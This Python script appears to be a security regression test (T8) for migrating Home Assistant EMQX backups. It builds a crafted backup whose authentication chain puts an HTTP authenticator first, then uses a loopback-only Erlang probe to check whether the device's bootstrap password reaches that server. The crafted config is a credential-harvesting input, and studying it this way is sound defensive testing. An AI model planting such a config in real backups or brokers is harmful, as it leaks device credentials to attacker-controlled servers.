"""T8: HA's authentication chain migrates (only this device's bootstrap metadata is re-attached). A crafted HA backup
puts an HTTP authenticator BEFORE the built-in database. After the product conversion, when one of THIS device's own
services logs in with its bootstrap credentials, does the candidate (= restored device broker) send that password to
the HTTP server HA's settings name? Loopback listener inside the candidate (--network none); the comparison runs
inside the candidate against its own bootstrap mount, only true/false leaves it.
Run: python3 -I t8_http_authn.py <codebase>"""
import io
import json
import os
import secrets
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import secrev_lab as L
import t1_datadir_acl as T1

HTTP_FIRST = (b'authentication = [\n'
              b'  { mechanism = password_based, backend = http, enable = true, method = post,\n'
              b'    url = "http://127.0.0.1:18833/auth", request_timeout = "3s",\n'
              b'    body { username = "${username}", password = "${password}" },\n'
              b'    headers { "content-type" = "application/json" } },\n'
              b'  { mechanism = password_based, backend = built_in_database, enable = true, user_id_type = username,\n'
              b'    password_hash_algorithm { name = sha256, salt_position = suffix } }\n]\n')
HA_HOCON = T1.HA_HOCON.split(b'authentication = [', 1)[0] + HTTP_FIRST
PROBE = ('{ok, B} = file:read_file("' + T1.BOOT + '"), '
         '[_, Row | _] = binary:split(B, <<"\\n">>, [global]), [U, P | _] = binary:split(Row, <<",">>, [global]), '
         'Self = self(), '
         'spawn(fun() -> {ok, L} = gen_tcp:listen(18833, [binary, {active, false}, {reuseaddr, true}, {ip, {127,0,0,1}}]), '
         'Self ! listening, R = case gen_tcp:accept(L, 20000) of {ok, S} -> case gen_tcp:recv(S, 0, 10000) of '
         '{ok, D} -> D; _ -> <<>> end; _ -> <<>> end, Self ! {captured, R} end), '
         'receive listening -> ok after 5000 -> ok end, '
         'C = #{zone => default, listener => \'tcp:default\', protocol => mqtt, peerhost => {127,0,0,1}, '
         'clientid => <<"device-service">>, username => U, password => P}, '
         'A = (catch emqx_access_control:authenticate(C)), '
         'Cap = receive {captured, X} -> X after 25000 -> <<>> end, '
         'io:format("WOOWT8:sent_http=~p:password_in_request=~p:login=~p:END", '
         '[byte_size(Cap) > 0, binary:match(Cap, P) =/= nomatch, element(1, A)]).')


def addon_tar():
    base = 'data/emqx/data/'
    return L.tar_bytes({
        'addon.json': json.dumps({'system': {'slug': 'woow-emqx', 'name': 'EMQX'}, 'version': '5.9.1',
                                  'user': {'image': 'ghcr.io/woowtech/woow-ha-emqx-amd64'}, 'state': 'stopped'}).encode(),
        'data/emqx/node.name': b'emqx@127.0.0.1\n',
        base + 'mnesia/emqx@127.0.0.1': None,
        base + 'configs/cluster.hocon': HA_HOCON,
        base + 'authz/acl.conf': T1.HA_ACL,
    })


def main(codebase):
    ha_emqx = L.use(codebase)
    started = time.time()
    result = {'test': 'T8 migrated HTTP authenticator receives this device bootstrap logins', 'codebase': codebase,
              'image': L.IMAGE, 'network': 'none', 'store': 'labpodman (separate --root)'}
    host_dir = tempfile.mkdtemp(prefix='t8-host-', dir=os.path.join(L.SR, 'runs'))
    os.chmod(host_dir, 0o755)
    acl_host = os.path.join(host_dir, 'acl.conf')
    with open(acl_host, 'wb') as handle:
        handle.write(T1.TARGET_ACL)
    os.chmod(acl_host, 0o644)
    secret = 'secrev-t8-bootstrap'
    L.lab('secret', 'rm', secret, check=False)
    L.lab('secret', 'create', secret, '-', input=b'user_id,password,is_superuser\nwoow,' +
          secrets.token_hex(16).encode() + b',false\n')
    target = L.LabTarget('t8', {'configs/cluster.hocon': T1.target_hocon('/opt/emqx/etc/acl.conf')},
                         ro_files=[(acl_host, '/opt/emqx/etc/acl.conf', 'ro')],
                         secrets_spec=[f'{secret},type=mount,target={T1.BOOT},uid=1000,gid=1000,mode=0400'])
    try:
        runner = L.make_runner()
        work = L.FakeWork(runner)
        inner = addon_tar()
        work.addon_member = lambda slug: slug
        work.open = lambda member: io.BytesIO(inner)
        work.addon_info = lambda slug: L.SimpleNamespace(version='5.9.1')
        app = L.SimpleNamespace(id='emqx', name='EMQX')
        staging = Path(tempfile.mkdtemp(prefix='t8-', dir=os.path.join(L.SR, 'runs')))
        with L.temp(runner) as tmp:
            try:
                ha_emqx._build_candidate(work, app, tmp, target, staging, version='5.8.9')
                result['conversion'] = 'PASSED (candidate built, all product checks green)'
            except L.BackupError as error:
                result['conversion'] = 'REFUSED: ' + error.message
            if tmp.running('emqx-new') and result['conversion'].startswith('PASSED'):
                ex = lambda c: tmp.exec('emqx-new', c, timeout=120, check=False)
                cfg = ha_emqx.read_effective_config(ex)
                result['candidate_authenticators'] = [(a.get('backend'), bool(a.get('bootstrap_file')))
                                                      for a in cfg.get('authentication', [])]
                tmp.exec('emqx-new', ['sh', '-c', 'umask 077; cat > /opt/emqx/log/secrev-t8.erl'], input=PROBE.encode(),
                         timeout=60, check=False)
                out = ex(['emqx', 'eval', '{ok, _} = file:script("/opt/emqx/log/secrev-t8.erl"), ok.']).stdout.decode(
                    errors='replace')
                result['candidate'] = out.split('WOOWT8:', 1)[-1].split(':END', 1)[0] if 'WOOWT8:' in out else 'unreadable'
    finally:
        target.remove()
        L.lab('secret', 'rm', secret, check=False)
    result['device_service_password_sent_to_ha_server'] = 'password_in_request=true' in result.get('candidate', '')
    result['elapsed_s'] = round(time.time() - started, 1)
    print(json.dumps(result, ensure_ascii=False, indent=1))
    L.evidence(os.path.join(L.SR, 'runs', f't8-{codebase}.json'), result)


if __name__ == '__main__':
    main(sys.argv[1])
